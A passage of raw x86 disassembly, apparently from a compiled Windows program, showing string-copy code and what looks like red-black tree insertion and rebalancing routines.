  40170d:	83 c1 60             	add    $0x60,%ecx
  401710:	e8 c1 2f 00 00       	call   0x4046d6
  401715:	8a 4c 24 13          	mov    0x13(%esp),%cl
  401719:	33 db                	xor    %ebx,%ebx
  40171b:	88 4c 24 28          	mov    %cl,0x28(%esp)
  40171f:	53                   	push   %ebx
  401720:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401724:	ff 15 98 62 40 00    	call   *0x406298
  40172a:	8d 7c 24 3c          	lea    0x3c(%esp),%edi
  40172e:	83 c9 ff             	or     $0xffffffff,%ecx
  401731:	33 c0                	xor    %eax,%eax
  401733:	6a 01                	push   $0x1
  401735:	f2 ae                	repnz scas %es:(%edi),%al
  401737:	f7 d1                	not    %ecx
  401739:	49                   	dec    %ecx
  40173a:	8b e9                	mov    %ecx,%ebp
  40173c:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401740:	55                   	push   %ebp
  401741:	ff 15 94 62 40 00    	call   *0x406294
  401747:	84 c0                	test   %al,%al
  401749:	74 23                	je     0x40176e
  40174b:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  40174f:	8b cd                	mov    %ebp,%ecx
  401751:	8b d1                	mov    %ecx,%edx
  401753:	8d 74 24 3c          	lea    0x3c(%esp),%esi
  401757:	c1 e9 02             	shr    $0x2,%ecx
  40175a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40175c:	8b ca                	mov    %edx,%ecx
  40175e:	55                   	push   %ebp
  40175f:	83 e1 03             	and    $0x3,%ecx
  401762:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401764:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401768:	ff 15 90 62 40 00    	call   *0x406290
  40176e:	8d 44 24 28          	lea    0x28(%esp),%eax
  401772:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401776:	50                   	push   %eax
  401777:	51                   	push   %ecx
  401778:	b9 b8 43 45 00       	mov    $0x4543b8,%ecx
  40177d:	89 9c 24 cc 00 00 00 	mov    %ebx,0xcc(%esp)
  401784:	e8 87 01 00 00       	call   0x401910
  401789:	8b 30                	mov    (%eax),%esi
  40178b:	6a 01                	push   $0x1
  40178d:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401791:	c7 84 24 c8 00 00 00 	movl   $0xffffffff,0xc8(%esp)
  401798:	ff ff ff ff 
  40179c:	ff 15 98 62 40 00    	call   *0x406298
  4017a2:	3b 35 bc 43 45 00    	cmp    0x4543bc,%esi
  4017a8:	74 7d                	je     0x401827
  4017aa:	8a 56 1c             	mov    0x1c(%esi),%dl
  4017ad:	8b 0d 8c 62 40 00    	mov    0x40628c,%ecx
  4017b3:	8d 46 1c             	lea    0x1c(%esi),%eax
  4017b6:	88 54 24 18          	mov    %dl,0x18(%esp)
  4017ba:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4017be:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4017c2:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  4017c6:	8b 11                	mov    (%ecx),%edx
  4017c8:	52                   	push   %edx
  4017c9:	53                   	push   %ebx
  4017ca:	50                   	push   %eax
  4017cb:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  4017cf:	ff 15 88 62 40 00    	call   *0x406288
  4017d5:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4017d9:	c7 84 24 c4 00 00 00 	movl   $0x1,0xc4(%esp)
  4017e0:	01 00 00 00 
  4017e4:	3b c3                	cmp    %ebx,%eax
  4017e6:	75 05                	jne    0x4017ed
  4017e8:	a1 84 62 40 00       	mov    0x406284,%eax
  4017ed:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4017f1:	50                   	push   %eax
  4017f2:	68 17 04 00 00       	push   $0x417
  4017f7:	e8 d4 2e 00 00       	call   0x4046d0
  4017fc:	8b c8                	mov    %eax,%ecx
  4017fe:	e8 c7 2e 00 00       	call   0x4046ca
  401803:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401807:	3b cb                	cmp    %ebx,%ecx
  401809:	74 1c                	je     0x401827
  40180b:	8a 41 ff             	mov    -0x1(%ecx),%al
  40180e:	3a c3                	cmp    %bl,%al
  401810:	74 0b                	je     0x40181d
  401812:	3c ff                	cmp    $0xff,%al
  401814:	74 07                	je     0x40181d
  401816:	fe c8                	dec    %al
  401818:	88 41 ff             	mov    %al,-0x1(%ecx)
  40181b:	eb 0a                	jmp    0x401827
  40181d:	49                   	dec    %ecx
  40181e:	51                   	push   %ecx
  40181f:	e8 fe 2d 00 00       	call   0x404622
  401824:	83 c4 04             	add    $0x4,%esp
  401827:	8b 8c 24 bc 00 00 00 	mov    0xbc(%esp),%ecx
  40182e:	5f                   	pop    %edi
  40182f:	5e                   	pop    %esi
  401830:	5d                   	pop    %ebp
  401831:	5b                   	pop    %ebx
  401832:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401839:	81 c4 b8 00 00 00    	add    $0xb8,%esp
  40183f:	c3                   	ret
  401840:	8b 01                	mov    (%ecx),%eax
  401842:	85 c0                	test   %eax,%eax
  401844:	74 06                	je     0x40184c
  401846:	8b 08                	mov    (%eax),%ecx
  401848:	50                   	push   %eax
  401849:	ff 51 08             	call   *0x8(%ecx)
  40184c:	c3                   	ret
  40184d:	90                   	nop
  40184e:	90                   	nop
  40184f:	90                   	nop
  401850:	8b 44 24 08          	mov    0x8(%esp),%eax
  401854:	8b 54 24 04          	mov    0x4(%esp),%edx
  401858:	53                   	push   %ebx
  401859:	55                   	push   %ebp
  40185a:	56                   	push   %esi
  40185b:	8b f1                	mov    %ecx,%esi
  40185d:	8a 08                	mov    (%eax),%cl
  40185f:	57                   	push   %edi
  401860:	88 0e                	mov    %cl,(%esi)
  401862:	8a 02                	mov    (%edx),%al
  401864:	33 db                	xor    %ebx,%ebx
  401866:	6a 30                	push   $0x30
  401868:	88 46 01             	mov    %al,0x1(%esi)
  40186b:	88 5e 08             	mov    %bl,0x8(%esi)
  40186e:	e8 69 2e 00 00       	call   0x4046dc
  401873:	8b f8                	mov    %eax,%edi
  401875:	83 c4 04             	add    $0x4,%esp
  401878:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40187c:	8b ef                	mov    %edi,%ebp
  40187e:	89 5f 04             	mov    %ebx,0x4(%edi)
  401881:	c7 47 2c 01 00 00 00 	movl   $0x1,0x2c(%edi)
  401888:	ff 15 7c 62 40 00    	call   *0x40627c
  40188e:	39 1d cc 43 45 00    	cmp    %ebx,0x4543cc
  401894:	75 13                	jne    0x4018a9
  401896:	89 3d cc 43 45 00    	mov    %edi,0x4543cc
  40189c:	89 1f                	mov    %ebx,(%edi)
  40189e:	8b 0d cc 43 45 00    	mov    0x4543cc,%ecx
  4018a4:	33 ed                	xor    %ebp,%ebp
  4018a6:	89 59 08             	mov    %ebx,0x8(%ecx)
  4018a9:	8b 0d c8 43 45 00    	mov    0x4543c8,%ecx
  4018af:	41                   	inc    %ecx
  4018b0:	89 0d c8 43 45 00    	mov    %ecx,0x4543c8
  4018b6:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4018ba:	ff 15 a0 62 40 00    	call   *0x4062a0
  4018c0:	3b eb                	cmp    %ebx,%ebp
  4018c2:	74 09                	je     0x4018cd
  4018c4:	55                   	push   %ebp
  4018c5:	e8 58 2d 00 00       	call   0x404622
  4018ca:	83 c4 04             	add    $0x4,%esp
  4018cd:	8b 3d cc 43 45 00    	mov    0x4543cc,%edi
  4018d3:	6a 30                	push   $0x30
  4018d5:	e8 02 2e 00 00       	call   0x4046dc
  4018da:	89 78 04             	mov    %edi,0x4(%eax)
  4018dd:	89 58 2c             	mov    %ebx,0x2c(%eax)
  4018e0:	89 46 04             	mov    %eax,0x4(%esi)
  4018e3:	89 5e 0c             	mov    %ebx,0xc(%esi)
  4018e6:	89 00                	mov    %eax,(%eax)
  4018e8:	8b 46 04             	mov    0x4(%esi),%eax
  4018eb:	83 c4 04             	add    $0x4,%esp
  4018ee:	89 40 08             	mov    %eax,0x8(%eax)
  4018f1:	8b c6                	mov    %esi,%eax
  4018f3:	5f                   	pop    %edi
  4018f4:	5e                   	pop    %esi
  4018f5:	5d                   	pop    %ebp
  4018f6:	5b                   	pop    %ebx
  4018f7:	c2 08 00             	ret    $0x8
  4018fa:	90                   	nop
  4018fb:	90                   	nop
  4018fc:	90                   	nop
  4018fd:	90                   	nop
  4018fe:	90                   	nop
  4018ff:	90                   	nop
  401900:	8b 41 04             	mov    0x4(%ecx),%eax
  401903:	8b 08                	mov    (%eax),%ecx
  401905:	8b 44 24 04          	mov    0x4(%esp),%eax
  401909:	89 08                	mov    %ecx,(%eax)
  40190b:	c2 04 00             	ret    $0x4
  40190e:	90                   	nop
  40190f:	90                   	nop
  401910:	51                   	push   %ecx
  401911:	53                   	push   %ebx
  401912:	8b d9                	mov    %ecx,%ebx
  401914:	55                   	push   %ebp
  401915:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401919:	8b 43 04             	mov    0x4(%ebx),%eax
  40191c:	56                   	push   %esi
  40191d:	57                   	push   %edi
  40191e:	8b f8                	mov    %eax,%edi
  401920:	8b 70 04             	mov    0x4(%eax),%esi
  401923:	a1 cc 43 45 00       	mov    0x4543cc,%eax
  401928:	3b f0                	cmp    %eax,%esi
  40192a:	74 23                	je     0x40194f
  40192c:	8d 46 0c             	lea    0xc(%esi),%eax
  40192f:	55                   	push   %ebp
  401930:	50                   	push   %eax
  401931:	ff 15 9c 62 40 00    	call   *0x40629c
  401937:	83 c4 08             	add    $0x8,%esp
  40193a:	84 c0                	test   %al,%al
  40193c:	74 05                	je     0x401943
  40193e:	8b 76 08             	mov    0x8(%esi),%esi
  401941:	eb 04                	jmp    0x401947
  401943:	8b fe                	mov    %esi,%edi
  401945:	8b 36                	mov    (%esi),%esi
  401947:	3b 35 cc 43 45 00    	cmp    0x4543cc,%esi
  40194d:	75 dd                	jne    0x40192c
  40194f:	8b 43 04             	mov    0x4(%ebx),%eax
  401952:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  401956:	3b f8                	cmp    %eax,%edi
  401958:	74 26                	je     0x401980
  40195a:	83 c7 0c             	add    $0xc,%edi
  40195d:	57                   	push   %edi
  40195e:	55                   	push   %ebp
  40195f:	ff 15 9c 62 40 00    	call   *0x40629c
  401965:	83 c4 08             	add    $0x8,%esp
  401968:	84 c0                	test   %al,%al
  40196a:	75 14                	jne    0x401980
  40196c:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401970:	5f                   	pop    %edi
  401971:	5e                   	pop    %esi
  401972:	5d                   	pop    %ebp
  401973:	8b 10                	mov    (%eax),%edx
  401975:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401979:	5b                   	pop    %ebx
  40197a:	89 10                	mov    %edx,(%eax)
  40197c:	59                   	pop    %ecx
  40197d:	c2 08 00             	ret    $0x8
  401980:	8b 4b 04             	mov    0x4(%ebx),%ecx
  401983:	8d 44 24 10          	lea    0x10(%esp),%eax
  401987:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40198b:	5f                   	pop    %edi
  40198c:	8b 10                	mov    (%eax),%edx
  40198e:	8b 44 24 14          	mov    0x14(%esp),%eax
  401992:	5e                   	pop    %esi
  401993:	5d                   	pop    %ebp
  401994:	89 10                	mov    %edx,(%eax)
  401996:	5b                   	pop    %ebx
  401997:	59                   	pop    %ecx
  401998:	c2 08 00             	ret    $0x8
  40199b:	90                   	nop
  40199c:	90                   	nop
  40199d:	90                   	nop
  40199e:	90                   	nop
  40199f:	90                   	nop
  4019a0:	83 ec 10             	sub    $0x10,%esp
  4019a3:	53                   	push   %ebx
  4019a4:	55                   	push   %ebp
  4019a5:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  4019a9:	56                   	push   %esi
  4019aa:	57                   	push   %edi
  4019ab:	8b 7c 24 28          	mov    0x28(%esp),%edi
  4019af:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  4019b3:	e8 b8 04 00 00       	call   0x401e70
  4019b8:	8b 37                	mov    (%edi),%esi
  4019ba:	8b 15 cc 43 45 00    	mov    0x4543cc,%edx
  4019c0:	8d 5f 08             	lea    0x8(%edi),%ebx
  4019c3:	3b f2                	cmp    %edx,%esi
  4019c5:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4019c9:	8b eb                	mov    %ebx,%ebp
  4019cb:	75 04                	jne    0x4019d1
  4019cd:	8b 33                	mov    (%ebx),%esi
  4019cf:	eb 1e                	jmp    0x4019ef
  4019d1:	8b 03                	mov    (%ebx),%eax
  4019d3:	3b c2                	cmp    %edx,%eax
  4019d5:	74 18                	je     0x4019ef
  4019d7:	8b 08                	mov    (%eax),%ecx
  4019d9:	3b ca                	cmp    %edx,%ecx
  4019db:	74 08                	je     0x4019e5
  4019dd:	8b c1                	mov    %ecx,%eax
  4019df:	8b 08                	mov    (%eax),%ecx
  4019e1:	3b ca                	cmp    %edx,%ecx
  4019e3:	75 f8                	jne    0x4019dd
  4019e5:	8b 70 08             	mov    0x8(%eax),%esi
  4019e8:	8d 68 08             	lea    0x8(%eax),%ebp
  4019eb:	89 44 24 14          	mov    %eax,0x14(%esp)
  4019ef:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4019f3:	ff 15 7c 62 40 00    	call   *0x40627c
  4019f9:	8b 54 24 14          	mov    0x14(%esp),%edx
  4019fd:	3b d7                	cmp    %edi,%edx
  4019ff:	74 65                	je     0x401a66
  401a01:	8b 07                	mov    (%edi),%eax
  401a03:	89 50 04             	mov    %edx,0x4(%eax)
  401a06:	8b 0f                	mov    (%edi),%ecx
  401a08:	89 0a                	mov    %ecx,(%edx)
  401a0a:	8b 03                	mov    (%ebx),%eax
  401a0c:	3b d0                	cmp    %eax,%edx
  401a0e:	75 05                	jne    0x401a15
  401a10:	89 56 04             	mov    %edx,0x4(%esi)
  401a13:	eb 15                	jmp    0x401a2a
  401a15:	8b 42 04             	mov    0x4(%edx),%eax
  401a18:	89 46 04             	mov    %eax,0x4(%esi)
  401a1b:	8b 4a 04             	mov    0x4(%edx),%ecx
  401a1e:	89 31                	mov    %esi,(%ecx)
  401a20:	8b 03                	mov    (%ebx),%eax
  401a22:	89 45 00             	mov    %eax,0x0(%ebp)
  401a25:	8b 0b                	mov    (%ebx),%ecx
  401a27:	89 51 04             	mov    %edx,0x4(%ecx)
  401a2a:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  401a2e:	8b 45 04             	mov    0x4(%ebp),%eax
  401a31:	39 78 04             	cmp    %edi,0x4(%eax)
  401a34:	75 05                	jne    0x401a3b
  401a36:	89 50 04             	mov    %edx,0x4(%eax)
  401a39:	eb 0e                	jmp    0x401a49
  401a3b:	8b 47 04             	mov    0x4(%edi),%eax
  401a3e:	39 38                	cmp    %edi,(%eax)
  401a40:	75 04                	jne    0x401a46
  401a42:	89 10                	mov    %edx,(%eax)
  401a44:	eb 03                	jmp    0x401a49
  401a46:	89 50 08             	mov    %edx,0x8(%eax)
  401a49:	8b 47 04             	mov    0x4(%edi),%eax
  401a4c:	89 7c 24 14          	mov    %edi,0x14(%esp)
  401a50:	89 42 04             	mov    %eax,0x4(%edx)
  401a53:	8b 4f 2c             	mov    0x2c(%edi),%ecx
  401a56:	8b 42 2c             	mov    0x2c(%edx),%eax
  401a59:	89 4a 2c             	mov    %ecx,0x2c(%edx)
  401a5c:	89 47 2c             	mov    %eax,0x2c(%edi)
  401a5f:	8b d7                	mov    %edi,%edx
  401a61:	e9 8f 00 00 00       	jmp    0x401af5
  401a66:	8b 42 04             	mov    0x4(%edx),%eax
  401a69:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401a6d:	89 46 04             	mov    %eax,0x4(%esi)
  401a70:	8b 41 04             	mov    0x4(%ecx),%eax
  401a73:	39 78 04             	cmp    %edi,0x4(%eax)
  401a76:	75 05                	jne    0x401a7d
  401a78:	89 70 04             	mov    %esi,0x4(%eax)
  401a7b:	eb 0e                	jmp    0x401a8b
  401a7d:	8b 47 04             	mov    0x4(%edi),%eax
  401a80:	39 38                	cmp    %edi,(%eax)
  401a82:	75 04                	jne    0x401a88
  401a84:	89 30                	mov    %esi,(%eax)
  401a86:	eb 03                	jmp    0x401a8b
  401a88:	89 70 08             	mov    %esi,0x8(%eax)
  401a8b:	8b 41 04             	mov    0x4(%ecx),%eax
  401a8e:	89 44 24 18          	mov    %eax,0x18(%esp)
  401a92:	39 38                	cmp    %edi,(%eax)
  401a94:	75 2d                	jne    0x401ac3
  401a96:	8b 2d cc 43 45 00    	mov    0x4543cc,%ebp
  401a9c:	39 2b                	cmp    %ebp,(%ebx)
  401a9e:	75 07                	jne    0x401aa7
  401aa0:	8b 5f 04             	mov    0x4(%edi),%ebx
  401aa3:	89 18                	mov    %ebx,(%eax)
  401aa5:	eb 1c                	jmp    0x401ac3
  401aa7:	8b 1e                	mov    (%esi),%ebx
  401aa9:	8b ce                	mov    %esi,%ecx
  401aab:	3b dd                	cmp    %ebp,%ebx
  401aad:	74 0e                	je     0x401abd
  401aaf:	8b c3                	mov    %ebx,%eax
  401ab1:	8b c8                	mov    %eax,%ecx
  401ab3:	8b 01                	mov    (%ecx),%eax
  401ab5:	3b c5                	cmp    %ebp,%eax
  401ab7:	75 f8                	jne    0x401ab1
  401ab9:	8b 44 24 18          	mov    0x18(%esp),%eax
  401abd:	89 08                	mov    %ecx,(%eax)
  401abf:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401ac3:	8b 69 04             	mov    0x4(%ecx),%ebp
  401ac6:	39 7d 08             	cmp    %edi,0x8(%ebp)
  401ac9:	75 26                	jne    0x401af1
  401acb:	8b 1d cc 43 45 00    	mov    0x4543cc,%ebx
  401ad1:	8b 07                	mov    (%edi),%eax
  401ad3:	3b c3                	cmp    %ebx,%eax
  401ad5:	75 05                	jne    0x401adc
  401ad7:	8b 4f 04             	mov    0x4(%edi),%ecx
  401ada:	eb 12                	jmp    0x401aee
  401adc:	8b 46 08             	mov    0x8(%esi),%eax
  401adf:	8b ce                	mov    %esi,%ecx
  401ae1:	3b c3                	cmp    %ebx,%eax
  401ae3:	74 09                	je     0x401aee
  401ae5:	8b c8                	mov    %eax,%ecx
  401ae7:	8b 41 08             	mov    0x8(%ecx),%eax
  401aea:	3b c3                	cmp    %ebx,%eax
  401aec:	75 f7                	jne    0x401ae5
  401aee:	89 4d 08             	mov    %ecx,0x8(%ebp)
  401af1:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  401af5:	8b 42 2c             	mov    0x2c(%edx),%eax
  401af8:	bf 01 00 00 00       	mov    $0x1,%edi
  401afd:	33 db                	xor    %ebx,%ebx
  401aff:	3b c7                	cmp    %edi,%eax
  401b01:	0f 85 66 02 00 00    	jne    0x401d6d
  401b07:	8b 55 04             	mov    0x4(%ebp),%edx
  401b0a:	3b 72 04             	cmp    0x4(%edx),%esi
  401b0d:	0f 84 57 02 00 00    	je     0x401d6a
  401b13:	39 7e 2c             	cmp    %edi,0x2c(%esi)
  401b16:	0f 85 4e 02 00 00    	jne    0x401d6a
  401b1c:	8b 4e 04             	mov    0x4(%esi),%ecx
  401b1f:	8b 01                	mov    (%ecx),%eax
  401b21:	3b f0                	cmp    %eax,%esi
  401b23:	75 6e                	jne    0x401b93
  401b25:	8b 41 08             	mov    0x8(%ecx),%eax
  401b28:	39 58 2c             	cmp    %ebx,0x2c(%eax)
  401b2b:	75 4d                	jne    0x401b7a
  401b2d:	89 78 2c             	mov    %edi,0x2c(%eax)
  401b30:	8b 46 04             	mov    0x4(%esi),%eax
  401b33:	89 58 2c             	mov    %ebx,0x2c(%eax)
  401b36:	8b 46 04             	mov    0x4(%esi),%eax
  401b39:	8b 48 08             	mov    0x8(%eax),%ecx
  401b3c:	8b 11                	mov    (%ecx),%edx
  401b3e:	89 50 08             	mov    %edx,0x8(%eax)
  401b41:	8b 11                	mov    (%ecx),%edx
  401b43:	3b 15 cc 43 45 00    	cmp    0x4543cc,%edx
  401b49:	74 03                	je     0x401b4e
  401b4b:	89 42 04             	mov    %eax,0x4(%edx)
  401b4e:	8b 50 04             	mov    0x4(%eax),%edx
  401b51:	89 51 04             	mov    %edx,0x4(%ecx)
  401b54:	8b 55 04             	mov    0x4(%ebp),%edx
  401b57:	3b 42 04             	cmp    0x4(%edx),%eax
  401b5a:	75 05                	jne    0x401b61
  401b5c:	89 4a 04             	mov    %ecx,0x4(%edx)
  401b5f:	eb 0e                	jmp    0x401b6f
  401b61:	8b 50 04             	mov    0x4(%eax),%edx
  401b64:	3b 02                	cmp    (%edx),%eax
  401b66:	75 04                	jne    0x401b6c
  401b68:	89 0a                	mov    %ecx,(%edx)
  401b6a:	eb 03                	jmp    0x401b6f
  401b6c:	89 4a 08             	mov    %ecx,0x8(%edx)
  401b6f:	89 01                	mov    %eax,(%ecx)
  401b71:	89 48 04             	mov    %ecx,0x4(%eax)
  401b74:	8b 46 04             	mov    0x4(%esi),%eax
  401b77:	8b 40 08             	mov    0x8(%eax),%eax
  401b7a:	8b 08                	mov    (%eax),%ecx
  401b7c:	39 79 2c             	cmp    %edi,0x2c(%ecx)
  401b7f:	0f 85 8f 00 00 00    	jne    0x401c14
  401b85:	8b 50 08             	mov    0x8(%eax),%edx
  401b88:	39 7a 2c             	cmp    %edi,0x2c(%edx)
  401b8b:	0f 85 83 00 00 00    	jne    0x401c14
  401b91:	eb 6a                	jmp    0x401bfd
  401b93:	39 58 2c             	cmp    %ebx,0x2c(%eax)
  401b96:	75 4e                	jne    0x401be6
  401b98:	89 78 2c             	mov    %edi,0x2c(%eax)
  401b9b:	8b 46 04             	mov    0x4(%esi),%eax
  401b9e:	89 58 2c             	mov    %ebx,0x2c(%eax)
  401ba1:	8b 46 04             	mov    0x4(%esi),%eax
  401ba4:	8b 08                	mov    (%eax),%ecx
  401ba6:	8b 51 08             	mov    0x8(%ecx),%edx
  401ba9:	89 10                	mov    %edx,(%eax)
  401bab:	8b 51 08             	mov    0x8(%ecx),%edx
  401bae:	3b 15 cc 43 45 00    	cmp    0x4543cc,%edx
  401bb4:	74 03                	je     0x401bb9
  401bb6:	89 42 04             	mov    %eax,0x4(%edx)
  401bb9:	8b 50 04             	mov    0x4(%eax),%edx
  401bbc:	89 51 04             	mov    %edx,0x4(%ecx)
  401bbf:	8b 55 04             	mov    0x4(%ebp),%edx
  401bc2:	3b 42 04             	cmp    0x4(%edx),%eax
  401bc5:	75 05                	jne    0x401bcc
  401bc7:	89 4a 04             	mov    %ecx,0x4(%edx)
  401bca:	eb 0f                	jmp    0x401bdb
  401bcc:	8b 50 04             	mov    0x4(%eax),%edx
  401bcf:	3b 42 08             	cmp    0x8(%edx),%eax
  401bd2:	75 05                	jne    0x401bd9
  401bd4:	89 4a 08             	mov    %ecx,0x8(%edx)
  401bd7:	eb 02                	jmp    0x401bdb
  401bd9:	89 0a                	mov    %ecx,(%edx)
  401bdb:	89 41 08             	mov    %eax,0x8(%ecx)
  401bde:	89 48 04             	mov    %ecx,0x4(%eax)
  401be1:	8b 46 04             	mov    0x4(%esi),%eax
  401be4:	8b 00                	mov    (%eax),%eax
  401be6:	8b 48 08             	mov    0x8(%eax),%ecx
  401be9:	39 79 2c             	cmp    %edi,0x2c(%ecx)
  401bec:	0f 85 d4 00 00 00    	jne    0x401cc6
  401bf2:	8b 10                	mov    (%eax),%edx
  401bf4:	39 7a 2c             	cmp    %edi,0x2c(%edx)
  401bf7:	0f 85 c9 00 00 00    	jne    0x401cc6
  401bfd:	89 58 2c             	mov    %ebx,0x2c(%eax)
  401c00:	8b 45 04             	mov    0x4(%ebp),%eax
  401c03:	8b 76 04             	mov    0x4(%esi),%esi
  401c06:	3b 70 04             	cmp    0x4(%eax),%esi
  401c09:	0f 85 04 ff ff ff    	jne    0x401b13
  401c0f:	e9 56 01 00 00       	jmp    0x401d6a
  401c14:	8b 48 08             	mov    0x8(%eax),%ecx
  401c17:	39 79 2c             	cmp    %edi,0x2c(%ecx)
  401c1a:	75 4b                	jne    0x401c67
  401c1c:	8b 10                	mov    (%eax),%edx
  401c1e:	89 7a 2c             	mov    %edi,0x2c(%edx)
  401c21:	8b 08                	mov    (%eax),%ecx
  401c23:	89 58 2c             	mov    %ebx,0x2c(%eax)
  401c26:	8b 51 08             	mov    0x8(%ecx),%edx
  401c29:	89 10                	mov    %edx,(%eax)
  401c2b:	8b 51 08             	mov    0x8(%ecx),%edx
  401c2e:	3b 15 cc 43 45 00    	cmp    0x4543cc,%edx
  401c34:	74 03                	je     0x401c39
  401c36:	89 42 04             	mov    %eax,0x4(%edx)
  401c39:	8b 50 04             	mov    0x4(%eax),%edx
  401c3c:	89 51 04             	mov    %edx,0x4(%ecx)
  401c3f:	8b 55 04             	mov    0x4(%ebp),%edx
  401c42:	3b 42 04             	cmp    0x4(%edx),%eax
  401c45:	75 05                	jne    0x401c4c
  401c47:	89 4a 04             	mov    %ecx,0x4(%edx)
  401c4a:	eb 0f                	jmp    0x401c5b
  401c4c:	8b 50 04             	mov    0x4(%eax),%edx
  401c4f:	3b 42 08             	cmp    0x8(%edx),%eax
  401c52:	75 05                	jne    0x401c59
  401c54:	89 4a 08             	mov    %ecx,0x8(%edx)
  401c57:	eb 02                	jmp    0x401c5b
  401c59:	89 0a                	mov    %ecx,(%edx)
  401c5b:	89 41 08             	mov    %eax,0x8(%ecx)
  401c5e:	89 48 04             	mov    %ecx,0x4(%eax)
  401c61:	8b 46 04             	mov    0x4(%esi),%eax
  401c64:	8b 40 08             	mov    0x8(%eax),%eax
  401c67:	8b 4e 04             	mov    0x4(%esi),%ecx
  401c6a:	8b 51 2c             	mov    0x2c(%ecx),%edx
  401c6d:	89 50 2c             	mov    %edx,0x2c(%eax)
  401c70:	8b 4e 04             	mov    0x4(%esi),%ecx
  401c73:	89 79 2c             	mov    %edi,0x2c(%ecx)
  401c76:	8b 50 08             	mov    0x8(%eax),%edx
  401c79:	89 7a 2c             	mov    %edi,0x2c(%edx)
  401c7c:	8b 46 04             	mov    0x4(%esi),%eax
  401c7f:	8b 48 08             	mov    0x8(%eax),%ecx
  401c82:	8b 11                	mov    (%ecx),%edx
  401c84:	89 50 08             	mov    %edx,0x8(%eax)
  401c87:	8b 11                	mov    (%ecx),%edx
  401c89:	3b 15 cc 43 45 00    	cmp    0x4543cc,%edx
  401c8f:	74 03                	je     0x401c94
  401c91:	89 42 04             	mov    %eax,0x4(%edx)
  401c94:	8b 50 04             	mov    0x4(%eax),%edx
  401c97:	89 51 04             	mov    %edx,0x4(%ecx)
  401c9a:	8b 55 04             	mov    0x4(%ebp),%edx
  401c9d:	3b 42 04             	cmp    0x4(%edx),%eax
  401ca0:	75 0a                	jne    0x401cac
  401ca2:	89 4a 04             	mov    %ecx,0x4(%edx)
  401ca5:	89 01                	mov    %eax,(%ecx)
  401ca7:	e9 bb 00 00 00       	jmp    0x401d67
  401cac:	8b 50 04             	mov    0x4(%eax),%edx
  401caf:	3b 02                	cmp    (%edx),%eax
  401cb1:	75 09                	jne    0x401cbc
  401cb3:	89 0a                	mov    %ecx,(%edx)
  401cb5:	89 01                	mov    %eax,(%ecx)
  401cb7:	e9 ab 00 00 00       	jmp    0x401d67
  401cbc:	89 4a 08             	mov    %ecx,0x8(%edx)
  401cbf:	89 01                	mov    %eax,(%ecx)
  401cc1:	e9 a1 00 00 00       	jmp    0x401d67
  401cc6:	8b 08                	mov    (%eax),%ecx
  401cc8:	39 79 2c             	cmp    %edi,0x2c(%ecx)
  401ccb:	75 49                	jne    0x401d16
  401ccd:	8b 50 08             	mov    0x8(%eax),%edx
  401cd0:	89 7a 2c             	mov    %edi,0x2c(%edx)
  401cd3:	8b 48 08             	mov    0x8(%eax),%ecx
  401cd6:	89 58 2c             	mov    %ebx,0x2c(%eax)
  401cd9:	8b 11                	mov    (%ecx),%edx
  401cdb:	89 50 08             	mov    %edx,0x8(%eax)
  401cde:	8b 11                	mov    (%ecx),%edx
  401ce0:	3b 15 cc 43 45 00    	cmp    0x4543cc,%edx
  401ce6:	74 03                	je     0x401ceb
  401ce8:	89 42 04             	mov    %eax,0x4(%edx)
  401ceb:	8b 50 04             	mov    0x4(%eax),%edx
  401cee:	89 51 04             	mov    %edx,0x4(%ecx)
  401cf1:	8b 55 04             	mov    0x4(%ebp),%edx
  401cf4:	3b 42 04             	cmp    0x4(%edx),%eax
  401cf7:	75 05                	jne    0x401cfe
  401cf9:	89 4a 04             	mov    %ecx,0x4(%edx)
  401cfc:	eb 0e                	jmp    0x401d0c
  401cfe:	8b 50 04             	mov    0x4(%eax),%edx
  401d01:	3b 02                	cmp    (%edx),%eax
  401d03:	75 04                	jne    0x401d09
  401d05:	89 0a                	mov    %ecx,(%edx)
  401d07:	eb 03                	jmp    0x401d0c
  401d09:	89 4a 08             	mov    %ecx,0x8(%edx)
  401d0c:	89 01                	mov    %eax,(%ecx)
  401d0e:	89 48 04             	mov    %ecx,0x4(%eax)
  401d11:	8b 46 04             	mov    0x4(%esi),%eax
  401d14:	8b 00                	mov    (%eax),%eax
  401d16:	8b 4e 04             	mov    0x4(%esi),%ecx
  401d19:	8b 51 2c             	mov    0x2c(%ecx),%edx
  401d1c:	89 50 2c             	mov    %edx,0x2c(%eax)
  401d1f:	8b 4e 04             	mov    0x4(%esi),%ecx
  401d22:	89 79 2c             	mov    %edi,0x2c(%ecx)
  401d25:	8b 10                	mov    (%eax),%edx
  401d27:	89 7a 2c             	mov    %edi,0x2c(%edx)
  401d2a:	8b 46 04             	mov    0x4(%esi),%eax
  401d2d:	8b 08                	mov    (%eax),%ecx
  401d2f:	8b 51 08             	mov    0x8(%ecx),%edx
  401d32:	89 10                	mov    %edx,(%eax)
